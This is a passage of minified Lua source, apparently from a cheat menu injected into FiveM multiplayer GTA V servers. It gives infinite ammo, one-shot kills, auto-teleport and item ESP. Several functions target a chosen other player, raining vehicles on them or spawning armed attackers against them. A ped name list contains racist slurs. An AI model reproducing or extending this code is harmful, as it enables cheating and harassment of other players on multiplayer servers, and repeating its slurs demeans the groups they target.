                    local hZ = b.CreateRuntimeTxd(c.fram.var.txdicts['header'])
                    a.Wait(40)
                    a.Wait(30)
                    local hh = b.GetDuiHandle(c.fram.var.txobjects['header'])
                    a.Wait(40)
                    b.CreateRuntimeTextureFromDuiHandle(hZ, 'header', hh)
                    a.Wait(50)
                end)
                c.fram.var.g_w = 0.2;
                c.fram.var.header_h = 0.0826;
                c.fram.var.bHeight = 0.0275;
                c.fram.var.screenOptions = 20;
                c.var.colors['menu:header'] = {255, 255, 255, 255}
                c.var.colors['menu:subTitlebackground'] = {12, 5, 47, 255}
                c.var.colors['menu:bottomsubTitlebackground'] = {12, 5, 47, 255}
                c.var.colors['menu:subTitleText'] = {255, 255, 255, 255}
                c.var.colors['menu:bottomsubTitlesprite'] = {255, 255, 255, 255}
                c.var.colors['menu:noSelectedText'] = {255, 255, 255, 255}
                c.var.colors['menu:noSelectedFeaturebackground'] = {
                    10, 10, 10, 255
                }
                c.var.colors['menu:noselectedmenuButtonSprite'] = {
                    255, 255, 255, 255
                }
                c.var.colors['menu:selectedmenuButtonSprite'] = {0, 0, 0, 255}
                c.var.colors['menu:checkbox'] = {255, 255, 255, 255}
                c.var.colors['menu:selectedCheckbox'] = {0, 0, 0, 255}
                c.var.colors['menu:separatorBrackets'] = {92, 43, 233, 255}
                c.var.colors['menu:selectedText'] = {10, 10, 10, 255}
                c.var.colors['menu:selectedFeaturebackground'] = {
                    92, 43, 233, 255
                }
                b.SetDuiUrl(c.fram.var.txobjects.header,
                            'https://cdn.upload.systems/uploads/QQUzLU4A.png')
            elseif c0 == 2 then
                a.CreateThread(function()
                    b.DestroyDui(c.fram.var.txobjects.header)
                    a.Wait(10)
                    local hZ = b.CreateRuntimeTxd(c.fram.var.txdicts['header'])
                    a.Wait(40)
                    a.Wait(30)
                    local hh = b.GetDuiHandle(c.fram.var.txobjects['header'])
                    a.Wait(40)
                    b.CreateRuntimeTextureFromDuiHandle(hZ, 'header', hh)
                    a.Wait(50)
                end)
                c.fram.var.g_w = 0.222;
                c.fram.var.header_h = 0.1;
                c.fram.var.bHeight = 0.0275;
                c.fram.var.screenOptions = 12;
                c.var.colors['menu:header'] = {52, 255, 153, 255}
                c.var.colors['menu:subTitlebackground'] = {10, 10, 10, 255}
                c.var.colors['menu:bottomsubTitlebackground'] = {
                    10, 10, 10, 255
                }
                c.var.colors['menu:subTitleText'] = {255, 255, 255, 255}
                c.var.colors['menu:bottomsubTitlesprite'] = {255, 255, 255, 255}
                c.var.colors['menu:noSelectedText'] = {255, 255, 255, 255}
                c.var.colors['menu:noSelectedFeaturebackground'] = {
                    10, 10, 10, 255
                }
                c.var.colors['menu:noselectedmenuButtonSprite'] = {
                    255, 255, 255, 255
                }
                c.var.colors['menu:selectedmenuButtonSprite'] = {
                    10, 10, 10, 255
                }
                c.var.colors['menu:checkbox'] = {255, 255, 255, 255}
                c.var.colors['menu:selectedCheckbox'] = {10, 10, 10, 255}
                c.var.colors['menu:separatorBrackets'] = {200, 0, 0, 255}
                c.var.colors['menu:selectedText'] = {10, 10, 10, 255}
                c.var.colors['menu:selectedFeaturebackground'] = {
                    240, 240, 240, 255
                }
            elseif c0 == 3 then
                a.CreateThread(function()
                    b.DestroyDui(c.fram.var.txobjects.header)
                    a.Wait(10)
                    local hZ = b.CreateRuntimeTxd(c.fram.var.txdicts['header'])
                    a.Wait(40)
                    a.Wait(30)
                    local hh = b.GetDuiHandle(c.fram.var.txobjects['header'])
                    a.Wait(40)
                    b.CreateRuntimeTextureFromDuiHandle(hZ, 'header', hh)
                    a.Wait(50)
                end)
                c.fram.var.g_w = 0.215;
                c.fram.var.header_h = 0.1;
                c.fram.var.bHeight = 0.03;
                c.fram.var.screenOptions = 20;
                c.var.colors['menu:header'] = {255, 128, 0, 255}
                c.var.colors['menu:subTitlebackground'] = {10, 10, 10, 255}
                c.var.colors['menu:bottomsubTitlebackground'] = {
                    10, 10, 10, 255
                }
                c.var.colors['menu:subTitleText'] = {255, 255, 255, 255}
                c.var.colors['menu:bottomsubTitlesprite'] = {255, 255, 255, 255}
                c.var.colors['menu:noSelectedText'] = {255, 255, 255, 255}
                c.var.colors['menu:noSelectedFeaturebackground'] = {
                    10, 10, 10, 255
                }
                c.var.colors['menu:noselectedmenuButtonSprite'] = {
                    255, 255, 255, 255
                }
                c.var.colors['menu:selectedmenuButtonSprite'] = {
                    10, 10, 10, 255
                }
                c.var.colors['menu:checkbox'] = {255, 255, 255, 255}
                c.var.colors['menu:selectedCheckbox'] = {10, 10, 10, 255}
                c.var.colors['menu:separatorBrackets'] = {255, 128, 0, 255}
                c.var.colors['menu:selectedText'] = {10, 10, 10, 255}
                c.var.colors['menu:selectedFeaturebackground'] = {
                    255, 128, 0, 255
                }
            end
        end,
        B_RampsIntoVehicles = function()
            local h_ = {
                'stt_prop_stunt_track_uturn', 'stt_prop_stunt_track_sh45_a',
                'stt_prop_stunt_track_sh45_a', 'stt_prop_stunt_track_slope15',
                'stt_prop_stunt_track_funnel'
            }
            a.CreateThread(function()
                for dc in c.func.EnumerateVehicles() do
                    c.func.CreateAndAttachPropToEntity(dc, h_[c._math
                                                           .random(1, #h_)],
                                                       false, 0.0, 0.0, 0.0)
                    a.Wait(5)
                end
            end)
        end,
        C_InfiniteAmmo = function()
            while c.var.checkbox['infiniteammo'] do
                a.Wait(0)
                local Q = b.PlayerPedId()
                if b.IsPedArmed(Q, 5) then
                    b.SetPedAmmo(Q, b.GetSelectedPedWeapon(Q), 132)
                end
            end
        end,
        ApplyKitToEntity = function(dc, i0)
            a.CreateThread(function()
                if c._type(i0) == 'string' then
                    if c._string.len(i0) < 4 then
                        c.fram.func.Notify('error', 'Corrupted kit data (IS).')
                        return
                    end
                    i0 = c._json.decode(i0)
                    if not i0 or c._type(i0) ~= 'table' then
                        c.fram.func.Notify('error', 'Corrupted kit data (DB).')
                        return
                    end
                end
                for k, eB in c._ipairs(i0) do
                    if eB[1] == 'weapon' then
                        b.GiveWeaponToPed(dc, b.GetHashKey(eB[2]), eB[3] or 250,
                                          true, false)
                    elseif eB[1] == 'armour' then
                        b.SetPedArmour(dc, eB[2])
                    elseif eB[1] == 'vehicle' then
                        if c.func.LoadModel(b.GetHashKey(eB[2])) then
                            b.CreateVehicle(b.GetHashKey(eB[2]),
                                            b.GetEntityCoords(dc),
                                            b.GetEntityHeading(dc), true, false)
                        end
                    end
                end
            end)
        end,
        C_OneShotKill = function()
            while c.var.checkbox['combat:oneshotkill'] do
                a.Wait(0)
                local Q = b.PlayerPedId()
                if b.IsPedShooting(Q) then
                    local eR, c8 = c.func.RenderCamRay(
                                       b.GetMaxRangeOfCurrentPedWeapon(Q))
                    local i1 = b.GetPedWeaponCoords(Q)
                    b.ShootSingleBulletBetweenCoords(i1.x, i1.y, i1.z, c8.x,
                                                     c8.y, c8.z, 200, false,
                                                     b.GetCurrentPedWeapon(Q),
                                                     Q, false, true, 1000.0)
                end
            end
        end,
        C_LaserSight = function()
            while c.var.checkbox['combat:lasersight'] do
                a.Wait(0)
                if b.IsPlayerFreeAiming(b.PlayerId()) and
                    b.IsPedArmed(b.PlayerPedId(), 5) then
                    local eR, c8 = c.func.RenderCamRay(500.0)
                    b.DrawLine(b.GetPedWeaponCoords(b.PlayerPedId()), c8, 255,
                               0, 0, 255)
                end
            end
        end,
        C_AutoTeleportToWaypoint = function()
            while c.var.checkbox['teleport:autowaypoint'] do
                a.Wait(10)
                c.func.B_TeleportToWaypoint()
            end
        end,
        C_ShootVehicles = function()
            while c.var.checkbox['weapon:shootvehicles'] do
                a.Wait(0)
                local Q = b.PlayerPedId()
                if b.IsPedShooting(Q) and
                    c.func.LoadModel(c.var.data.ShootVehicles) then
                    local c8 = b.GetEntityCoords(Q)
                    local cY = c.func
                                   .RotationToDirection(b.GetGameplayCamRot(0))
                    local vehicle = b.CreateVehicle(c.var.data.ShootVehicles,
                                                    c8.x + cY.x * 10.0,
                                                    c8.y + cY.y * 10.0,
                                                    c8.z + 2.0,
                                                    b.GetEntityHeading(Q), true,
                                                    false)
                    b.ApplyForceToEntity(vehicle, 3, cY * 90.0, 0.0, 0.0, 0.0,
                                         0.0, 0.0, 0, true, false, true, true,
                                         true)
                end
            end
        end,
        B_RainVehicles = function()
            a.CreateThread(function()
                local cb = c.var.data.RainVehicles.Model;
                if c.func.LoadModel(cb) then
                    for ev = 1, c.var.data.RainVehicles.Times, 1 do
                        a.Wait(c.var.data.RainVehicles.Delay)
                        local i2 = b.GetEntityCoords(
                                       b.GetPlayerPed(c.var.data.selectedPlayer
                                                          .lid))
                        local vehicle = b.CreateVehicle(cb, i2.x, i2.y,
                                                        i2.z + 25.0,
                                                        c._math.random(0, 360),
                                                        true, false)
                        b.SetEntityVelocity(vehicle, 0.0, 0.0, -100.0)
                    end
                end
            end)
        end,
        B_RandomSkinComponents = function(Q)
            Q = Q or b.PlayerPedId()
            b.SetPedRandomComponentVariation(Q, false)
            b.SetPedRandomProps(Q)
        end,
        B_BaldiesAttack = function()
            a.CreateThread(function()
                local n = b.GetHashKey('mp_m_freemode_01')
                local gZ = b.GetHashKey(c.var.data.BaldiesAttack.Weapon)
                if c.func.LoadModel(n) then
                    for ev = 1, c.var.data.BaldiesAttack.Times, 1 do
                        a.Wait(c.var.data.BaldiesAttack.Delay)
                        local dc = b.GetPlayerPed(c.var.data.selectedPlayer.lid)
                        local c8 = b.GetEntityCoords(dc)
                        local Q = b.CreatePed(17, n, c8.x, c8.y, c8.z + 0.1,
                                              b.GetEntityHeading(dc) - 180.0,
                                              true, false)
                        c.func.B_RandomSkinComponents(Q)
                        b.GiveWeaponToPed(Q, gZ, 9999, 1, 1)
                        b.SetPedCanSwitchWeapon(Q, false)
                        b.SetPedCombatAttributes(Q, 46, true)
                        b.TaskCombatPed(Q, dc, 0, 16)
                    end
                end
            end)
        end,
        C_GlifeZombiesTeleport = function()
            local i3;
            local i4 = 0;
            if c.var.checkbox['glife:tpzombies'] then
                c.fram.func.Notify('info', 'Press E to set the point')
            end
            while c.var.checkbox['glife:tpzombies'] and not i3 do
                a.Wait(0)
                if b.IsAnyControlJustPressed(0, c.Keys['E']) then
                    i3 = b.GetEntityCoords(b.PlayerPedId())
                end
            end
            while c.var.checkbox['glife:tpzombies'] do
                a.Wait(0)
                local Q = b.PlayerPedId()
                local time = b.GetGameTimer()
                b.DrawMarker(21, i3, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.5, 0.5,
                             0.6, 200, 200, 200, 100, true, false, false, true)
                if time - i4 > 10000 then
                    for dc in c.func.EnumeratePeds() do
                        if not b.IsPedAPlayer(dc) and dc ~= Q then
                            b.SetEntityCoords(dc, i3)
                        end
                    end
                    i4 = time
                end
            end
        end,
        C_KillZombies = function()
            while c.var.checkbox['glife:killzombies'] do
                a.Wait(0)
                local Q = b.PlayerPedId()
                for dc in c.func.EnumeratePeds() do
                    if not b.IsPedAPlayer(dc) and dc ~= Q and
                        b.GetEntityHealth(dc) > 0 then
                        b.SetEntityHealth(dc, 0)
                    end
                end
            end
        end,
        C_RagdollZombies = function()
            while c.var.checkbox['glife:ragdollzombies'] do
                a.Wait(600)
                local Q = b.PlayerPedId()
                for dc in c.func.EnumeratePeds() do
                    if not b.IsPedAPlayer(dc) and dc ~= Q and
                        b.GetEntityHealth(dc) > 0 then
                        b.SetPedToRagdoll(dc, 1000, 1000, 0, 0, 0, 0)
                    end
                end
            end
        end,
        C_BagESP = function()
            while c.var.checkbox['glife:bagsesp:toggle'] do
                a.Wait(0)
                local c8 = b.GetEntityCoords(b.PlayerPedId())
                local h6 = 1 / b.GetGameplayCamFov() * 100;
                local h5 = b.GetGameplayCamCoords()
                for dc in c.func.EnumerateProps() do
                    if b.GetEntityModel(dc) == 1234788901 then
                        local h7 = b.GetEntityCoords(dc)
                        local h8 = #(h5 - h7)
                        if c.var.checkbox['glife:bagsesp:drawline'] then
                            b.DrawLine(h7, c8, c.var.colors['bagsesp:lines'][1],
                                       c.var.colors['bagsesp:lines'][2],
                                       c.var.colors['bagsesp:lines'][3],
                                       c.var.colors['bagsesp:lines'][4])
                        end
                        if (c.var.checkbox['glife:bagsesp:drawframe'] or
                            c.var.checkbox['glife:bagsesp:drawbox']) and
                            b.IsEntityOnScreen(dc) then
                            b.SetDrawOrigin(h7)
                            local z = 1 / h8 * 2 * h6;
                            local s = 0.13 * z;
                            local t = 0.2 * z;
                            if c.var.checkbox['glife:bagsesp:drawbox'] then
                                b.DrawRect(0.0, 0.0, s, t,
                                           c.var.colors['bagsesp:box'][1],
                                           c.var.colors['bagsesp:box'][2],
                                           c.var.colors['bagsesp:box'][3],
                                           c.var.colors['bagsesp:box'][4])
                            end
                            if c.var.checkbox['glife:bagsesp:drawframe'] then
                                local i5 = s * 0.505;
                                local i6 = t * 0.50;
                                local i7 = 0.0009 / z * z;
                                local i8 = 0.00126 / z * z;
                                b.DrawRect(i5, 0.0, i7, t,
                                           c.var.colors['bagsesp:frame'][1],
                                           c.var.colors['bagsesp:frame'][2],
                                           c.var.colors['bagsesp:frame'][3],
                                           c.var.colors['bagsesp:frame'][4])
                                b.DrawRect(-i5, 0.0, i7, t,
                                           c.var.colors['bagsesp:frame'][1],
                                           c.var.colors['bagsesp:frame'][2],
                                           c.var.colors['bagsesp:frame'][3],
                                           c.var.colors['bagsesp:frame'][4])
                                b.DrawRect(0.0, i6, s * 1.01, i8,
                                           c.var.colors['bagsesp:frame'][1],
                                           c.var.colors['bagsesp:frame'][2],
                                           c.var.colors['bagsesp:frame'][3],
                                           c.var.colors['bagsesp:frame'][4])
                                b.DrawRect(0.0, -i6, s * 1.01, i8,
                                           c.var.colors['bagsesp:frame'][1],
                                           c.var.colors['bagsesp:frame'][2],
                                           c.var.colors['bagsesp:frame'][3],
                                           c.var.colors['bagsesp:frame'][4])
                            end
                            b.ClearDrawOrigin()
                        end
                    end
                end
            end
        end
    }
    c.var.data = {
        PokemonGo = {
            spawnedPeds = {},
            selectedPed = 'a_m_y_vinewood_01',
            pedList = {'Nigachu', 'Mexizard', 'Squirty', 'Nigaslax', 'Prodigy'},
            pedListdata = {
                'a_m_y_vinewood_01', 'a_m_y_mexthug_01', 'cs_gurk',
                'a_m_m_fatlatin_01', 'a_m_m_acult_01'
            }
        },
        AllWeapons = {
            'weapon_dagger', 'weapon_bat', 'weapon_bottle', 'weapon_crowbar',
            'weapon_unarmed', 'weapon_flashlight', 'weapon_golfclub',
            'weapon_hammer', 'weapon_hatchet', 'weapon_knuckle', 'weapon_knife',
            'weapon_machete', 'weapon_switchblade', 'weapon_nightstick',
            'weapon_wrench', 'weapon_battleaxe', 'weapon_poolcue',
            'weapon_pistol', 'weapon_pistol_mk2', 'weapon_combatpistol',
            'weapon_appistol', 'weapon_stungun', 'weapon_pistol50',
            'weapon_snspistol', 'weapon_snspistol_mk2', 'weapon_heavypistol',
            'weapon_vintagepistol', 'weapon_flaregun', 'weapon_marksmanpistol',
            'weapon_revolver', 'weapon_revolver_mk2', 'weapon_doubleaction',
            'weapon_raypistol', 'weapon_ceramicpistol', 'weapon_microsmg',
            'weapon_smg', 'weapon_smg_mk2', 'weapon_assaultsmg',
            'weapon_combatpdw', 'weapon_machinepistol', 'weapon_minismg',
            'weapon_raycarbine', 'weapon_pumpshotgun', 'weapon_pumpshotgun_mk2',
            'weapon_sawnoffshotgun', 'weapon_assaultshotgun',
            'weapon_bullpupshotgun', 'weapon_musket', 'weapon_heavyshotgun',
            'weapon_dbshotgun', 'weapon_autoshotgun', 'weapon_assaultrifle',
            'weapon_assaultrifle_mk2', 'weapon_carbinerifle',
            'weapon_carbinerifle_mk2', 'weapon_advancedrifle',
            'weapon_specialcarbine', 'weapon_specialcarbine_mk2',
            'weapon_bullpuprifle', 'weapon_bullpuprifle_mk2',
            'weapon_compactrifle', 'weapon_mg', 'weapon_combatmg',
            'weapon_combatmg_mk2', 'weapon_gusenberg', 'weapon_sniperrifle',
            'weapon_heavysniper', 'weapon_heavysniper_mk2',
            'weapon_marksmanrifle', 'weapon_marksmanrifle_mk2', 'weapon_rpg',
            'weapon_grenadelauncher', 'weapon_grenadelauncher_smoke',
            'weapon_minigun', 'weapon_firework', 'weapon_railgun',
            'weapon_hominglauncher', 'weapon_compactlauncher',
            'weapon_rayminigun', 'weapon_grenade', 'weapon_bzgas',
            'weapon_molotov', 'weapon_stickybomb', 'weapon_proxmine',
            'weapon_snowball', 'weapon_pipebomb', 'weapon_ball',
            'weapon_smokegrenade', 'weapon_flare', 'weapon_petrolcan',
            'gadget_parachute', 'weapon_fireextinguisher', 'weapon_hazardcan'
        },
        WardobeMakerValues = {
            props = {
                [0] = {
                    'Hat', c.fram.func.NumberTableGenner(1, 134, 1, true),
                    c.fram.func.NumberTableGenner(1, 25, 1, true)
                },
                [1] = {
                    'Glasses', c.fram.func.NumberTableGenner(1, 27, 1, true),
                    c.fram.func.NumberTableGenner(1, 10, 1, true)
                },
                [2] = {
                    'Ears', c.fram.func.NumberTableGenner(1, 10, 1, true),
                    c.fram.func.NumberTableGenner(1, 10, 1, true)
                }
            },
            components = {
                [1] = {
                    'Mask', c.fram.func.NumberTableGenner(1, 146, 1, true),
                    c.fram.func.NumberTableGenner(1, 25, 1, true)
                },
                [2] = {
                    'Haircut', c.fram.func.NumberTableGenner(1, 22, 1, true),
                    c.fram.func.NumberTableGenner(1, 22, 1, true)
                },
                [11] = {
                    'Torso 2', c.fram.func.NumberTableGenner(1, 287, 1, true),
                    c.fram.func.NumberTableGenner(1, 22, 1, true)
                },
                [8] = {
                    'TShirt', c.fram.func.NumberTableGenner(1, 143, 1, true),
                    c.fram.func.NumberTableGenner(1, 25, 1, true)
                },
                [3] = {
                    'Hands', c.fram.func.NumberTableGenner(1, 167, 1, true),
                    c.fram.func.NumberTableGenner(1, 10, 1, true)
                },
                [9] = {
                    'Body Armour',
                    c.fram.func.NumberTableGenner(1, 37, 1, true),
                    c.fram.func.NumberTableGenner(1, 10, 1, true)
                },
                [10] = {
                    'Decals', c.fram.func.NumberTableGenner(1, 67, 1, true),
                    c.fram.func.NumberTableGenner(1, 5, 1, true)
                },
                [4] = {
                    'Pants', c.fram.func.NumberTableGenner(1, 114, 1, true),
                    c.fram.func.NumberTableGenner(1, 10, 1, true)
                },
                [6] = {
                    'Shoes', c.fram.func.NumberTableGenner(1, 90, 1, true),
                    c.fram.func.NumberTableGenner(1, 10, 1, true)
                }
            }
        },
        AnimationsList = {
            Festives = {
                info = {
                    {type = 'scenario', data = {anim = 'WORLD_HUMAN_SMOKING'}},
                    {type = 'scenario', data = {anim = 'WORLD_HUMAN_MUSICIAN'}},
                    {
                        type = 'anim',
                        data = {
                            lib = 'anim@mp_player_intcelebrationmale@dj',
                            anim = 'dj'
                        }
                    },
                    {
                        type = 'scenario',
                        data = {anim = '    WORLD_HUMAN_DRINKING'}
                    }, {
                        type = 'anim',
                        data = {
                            lib = 'anim@mp_player_intcelebrationmale@air_guitar',
                            anim = 'air_guitar'
                        }
                    }, {
                        type = 'anim',
                        data = {
                            lib = 'anim@mp_player_intcelebrationfemale@air_shagging',
                            anim = 'air_shagging'
                        }
                    }, {
                        type = 'anim',
                        data = {
                            lib = 'mp_player_int_upperrock',
                            anim = 'mp_player_int_rock'
                        }
                    },
                    {
                        type = 'scenario',
                        data = {anim = 'WORLD_HUMAN_SMOKING_POT'}
                    }, {
                        type = 'anim',
                        data = {
                            lib = 'amb@world_human_bum_standing@drunk@idle_a',
                            anim = 'idle_a'
                        }
                    },
                    {
                        type = 'anim',
                        data = {
                            lib = 'oddjobs@taxi@tie',
                            anim = 'vomit_outside'
                        }
                    }
                },
                labels = {
                    'smoke a cigarette', 'Play music', 'Dj', 'Drink a beer',
                    'Air Guitar', 'Air Shagging', 'Rock\'n\'roll',
                    'Smoke a joint', 'Stuffed on the spot', 'Vomit by car'
                }
            },
            Salutations = {
                info = {
                    {
                        type = 'anim',
                        data = {
                            lib = 'gestures@m@standing@casual',
                            anim = 'gesture_hello'
                        }
                    },
                    {
                        type = 'anim',
                        data = {
                            lib = 'mp_ped_interaction',
                            anim = 'handshake_guy_a'
                        }
                    },
                    {
                        type = 'anim',
                        data = {lib = 'mp_ped_interaction', anim = 'hugs_guy_a'}
                    }, {
                        type = 'anim',
                        data = {
                            lib = 'mp_player_int_uppersalute',
                            anim = 'mp_player_int_salute'
                        }
                    }
                },
                labels = {'Greet', 'Shakinghands', 'Hug', 'Salute'}
            },
            Work = {
                info = {
                    {
                        type = 'anim',
                        data = {lib = 'random@arrests@busted', anim = 'idle_c'}
                    }, {
                        type = 'anim',
                        data = {
                            lib = 'amb@code_human_police_investigate@idle_b',
                            anim = 'idle_f'
                        }
                    }, {
                        type = 'anim',
                        data = {
                            lib = 'random@arrests',
                            anim = 'generic_radio_chatter'
                        }
                    },
                    {
                        type = 'scenario',
                        data = {anim = 'WORLD_HUMAN_CAR_PARK_ATTENDANT'}
                    },
                    {
                        type = 'scenario',
                        data = {anim = 'WORLD_HUMAN_BINOCULARS'}
                    },
                    {
                        type = 'scenario',
                        data = {anim = 'world_human_gardener_plant'}
                    },
                    {
                        type = 'anim',
                        data = {lib = 'mini@repair', anim = 'fixing_a_ped'}
                    },
                    {
                        type = 'scenario',
                        data = {anim = 'CODE_HUMAN_MEDIC_KNEEL'}
                    },
                    {
                        type = 'anim',
                        data = {
                            lib = 'oddjobs@taxi@driver',
                            anim = 'leanover_idle'
                        }
                    }, {
                        type = 'anim',
                        data = {
                            lib = 'oddjobs@taxi@cyi',
                            anim = 'std_hand_off_ps_passenger'
                        }
                    }, {
                        type = 'anim',
                        data = {
                            lib = 'mp_am_hold_up',
                            anim = 'purchase_beerbox_shopkeeper'
                        }
                    },
                    {
                        type = 'anim',
                        data = {lib = 'mini@drinking', anim = 'shots_barman_b'}
                    },
                    {type = 'scenario', data = {anim = 'WORLD_HUMAN_PAPARAZZI'}},
                    {type = 'scenario', data = {anim = 'WORLD_HUMAN_CLIPBOARD'}},
                    {
                        type = 'scenario',
                        data = {anim = 'world_human_stand_fishing'}
                    },
                    {type = 'scenario', data = {anim = 'WORLD_HUMAN_HAMMERING'}},
                    {
                        type = 'scenario',
                        data = {anim = 'WORLD_HUMAN_HUMAN_STATUE'}
                    }
                },
                labels = {
                    'Idle', 'Investigate', 'Talk on the radio', 'Traffic',
                    'Binoculars', 'Harvest', 'Repair the engine', 'Observe',
                    'talk to the customer', 'Give the bill',
                    'Give the shopping', 'Serve a shot', 'Take a picture',
                    'Take Notes', 'Fisher', 'Hammer blow', 'Make the statue'
                }
            },
            Humor = {
                info = {
                    {type = 'scenario', data = {anim = 'WORLD_HUMAN_CHEERING'}},
                    {
                        type = 'anim',
                        data = {lib = 'mp_action', anim = 'thanks_male_06'}
                    }, {
                        type = 'anim',
                        data = {
                            lib = 'gestures@m@standing@casual',
                            anim = 'gesture_point'
                        }
                    }, {
                        type = 'anim',
                        data = {
                            lib = 'gestures@m@standing@casual',
                            anim = 'gesture_come_here_soft'
                        }
                    }, {
                        type = 'anim',
                        data = {
                            lib = 'gestures@m@standing@casual',
                            anim = 'gesture_bring_it_on'
                        }
                    }, {
                        type = 'anim',
                        data = {
                            lib = 'gestures@m@standing@casual',
                            anim = 'gesture_me'
                        }
                    },
                    {
                        type = 'anim',
                        data = {
                            lib = 'anim@am_hold_up@male',
                            anim = 'shoplift_high'
                        }
                    }, {
                        type = 'scenario',
                        data = {
                            lib = 'amb@world_human_jog_standing@male@idle_b',
                            anim = 'idle_d'
                        }
                    }, {
                        type = 'scenario',
                        data = {
                            lib = 'amb@world_human_bum_standing@depressed@idle_a',
                            anim = 'idle_a'
                        }
                    }, {
                        type = 'anim',
                        data = {
                            lib = 'anim@mp_player_intcelebrationmale@face_palm',
                            anim = 'face_palm'
                        }
                    }, {
                        type = 'anim',
                        data = {
                            lib = 'gestures@m@standing@casual',
                            anim = 'gesture_easy_now'
                        }
                    }, {
                        type = 'anim',
                        data = {
                            lib = 'oddjobs@assassinate@multi@',
                            anim = 'react_big_variations_a'
                        }
                    }, {
                        type = 'anim',
                        data = {
                            lib = 'amb@code_human_cower_stand@male@react_cowering',
                            anim = 'base_right'
                        }
                    }, {
                        type = 'anim',
                        data = {
                            lib = 'anim@deathmatch_intros@unarmed',
                            anim = 'intro_male_unarmed_e'
                        }
                    }, {
                        type = 'anim',
                        data = {
                            lib = 'gestures@m@standing@casual',
                            anim = 'gesture_damn'
                        }
                    },
                    {
                        type = 'anim',
                        data = {
                            lib = 'mp_ped_interaction',
                            anim = 'kisses_guy_a'
                        }
                    }, {
                        type = 'anim',
                        data = {
                            lib = 'mp_player_int_upperfinger',
                            anim = 'mp_player_int_finger_01_enter'
                        }
                    }, {
                        type = 'anim',
                        data = {
                            lib = 'mp_player_int_upperwank',
                            anim = 'mp_player_int_wank_01'
                        }
                    },
                    {
                        type = 'anim',
                        data = {lib = 'mp_suicide', anim = 'pistol'}
                    }
                },
                labels = {
                    'Cheering', 'Thank you', 'Point', 'Come Here', 'Bring it',
                    'To me', 'I knew it, fucking', 'Be exhausted',
                    'I\'m in the shit', 'Facepalm', 'Calm down',
                    'What did I do?', 'To fear', 'Fight?', 'Impossible',
                    'Embrace', 'Finger of honor', 'Wanker', 'Bullet in the head'
                }
            },
            Attitudes = {
                info = {
                    {
                        type = 'attitude',
                        data = {
                            lib = 'move_m@confident',
                            anim = 'move_m@confident'
                        }
                    },
                    {
                        type = 'attitude',
                        data = {lib = 'move_f@heels@c', anim = 'move_f@heels@c'}
                    }, {
                        type = 'attitude',
                        data = {
                            lib = 'move_m@depressed@a',
                            anim = 'move_m@depressed@a'
                        }
                    }, {
                        type = 'attitude',
                        data = {
                            lib = 'move_f@depressed@a',
                            anim = 'move_f@depressed@a'
                        }
                    }, {
                        type = 'attitude',
                        data = {
                            lib = 'move_m@business@a',
                            anim = 'move_m@business@a'
                        }
                    },
                    {
                        type = 'attitude',
                        data = {lib = 'move_m@brave@a', anim = 'move_m@brave@a'}
                    },
                    {
                        type = 'attitude',
                        data = {
                            lib = 'move_m@casual@a',
                            anim = 'move_m@casual@a'
                        }
                    },
                    {
                        type = 'attitude',
                        data = {lib = 'move_m@fat@a', anim = 'move_m@fat@a'}
                    }, {
                        type = 'attitude',
                        data = {
                            lib = 'move_m@hipster@a',
                            anim = 'move_m@hipster@a'
                        }
                    },
                    {
                        type = 'attitude',
                        data = {lib = 'move_m@injured', anim = 'move_m@injured'}
                    },
                    {
                        type = 'attitude',
                        data = {lib = 'move_m@hurry@a', anim = 'move_m@hurry@a'}
                    },
                    {
                        type = 'attitude',
                        data = {lib = 'move_m@hobo@a', anim = 'move_m@hobo@a'}
                    },
                    {
                        type = 'attitude',
                        data = {lib = 'move_m@sad@a', anim = 'move_m@sad@a'}
                    },
                    {
                        type = 'attitude',
                        data = {
                            lib = 'move_m@muscle@a',
                            anim = 'move_m@muscle@a'
                        }
                    }, {
                        type = 'attitude',
                        data = {
                            lib = 'move_m@shocked@a',
                            anim = 'move_m@shocked@a'
                        }
                    }, {
                        type = 'attitude',
                        data = {
                            lib = 'move_m@shadyped@a',
                            anim = 'move_m@shadyped@a'
                        }
                    },
                    {
                        type = 'attitude',
                        data = {lib = 'move_m@buzzed', anim = 'move_m@buzzed'}
                    }, {
                        type = 'attitude',
                        data = {
                            lib = 'move_m@hurry_butch@a',
                            anim = 'move_m@hurry_butch@a'
                        }
                    },
                    {
                        type = 'attitude',
                        data = {lib = 'move_m@money', anim = 'move_m@money'}
                    },
                    {
                        type = 'attitude',
                        data = {lib = 'move_m@quick', anim = 'move_m@quick'}
                    },
                    {
                        type = 'attitude',
                        data = {
                            lib = 'move_f@maneater',
                            anim = 'move_f@maneater'
                        }
                    },
                    {
                        type = 'attitude',
                        data = {lib = 'move_f@sassy', anim = 'move_f@sassy'}
                    }, {
                        type = 'attitude',
                        data = {
                            lib = 'move_f@arrogant@a',
                            anim = 'move_f@arrogant@a'
                        }
                    }
                },
                labels = {
                    'Normal M', 'Normal F', 'Depressive M', 'Depressive F',
                    'Business', 'Determined', 'Casual', 'Full', 'Hipster',
                    'Injured', 'intimidated', 'Hobo', 'Unfortunate', 'Muscle',
                    'Choc', 'Sombre', 'Tired', 'Hurry', 'Proud', 'Race',
                    'Eating', 'Impertinent', 'Arrogant'
                }
            },
            Sports = {
                info = {
                    {
                        type = 'anim',
                        data = {
                            lib = 'amb@world_human_muscle_flex@arms_at_side@base',
                            anim = 'base'
                        }
                    }, {
                        type = 'anim',
                        data = {
                            lib = 'amb@world_human_muscle_free_weights@male@barbell@base',
                            anim = 'base'
                        }
                    }, {
                        type = 'anim',
                        data = {
                            lib = 'amb@world_human_push_ups@male@base',
                            anim = 'base'
                        }
                    }, {
                        type = 'anim',
                        data = {
                            lib = 'amb@world_human_sit_ups@male@base',
                            anim = 'base'
                        }
                    }, {
                        type = 'anim',
                        data = {
                            lib = 'amb@world_human_yoga@male@base',
                            anim = 'base_a'
                        }
                    }
                },
                labels = {
                    'Show your muscles', 'Weight bar', 'Do push-ups',
                    'Doing abs', 'Do yoga'
                }
            },
            Misc = {
                info = {
                    {
                        type = 'anim',
                        data = {
                            lib = 'amb@world_human_aa_coffee@idle_a',
                            anim = 'idle_a'
                        }
                    }, {
                        type = 'anim',
                        data = {
                            lib = 'anim@heists@prison_heistunfinished_biztarget_idle',
                            anim = 'target_idle'
                        }
                    },
                    {type = 'scenario', data = {anim = 'world_human_leaning'}},
                    {
                        type = 'scenario',
                        data = {anim = 'WORLD_HUMAN_SUNBATHE_BACK'}
                    },
                    {type = 'scenario', data = {anim = 'WORLD_HUMAN_SUNBATHE'}},
                    {
                        type = 'scenario',
                        data = {anim = 'world_human_maid_clean'}
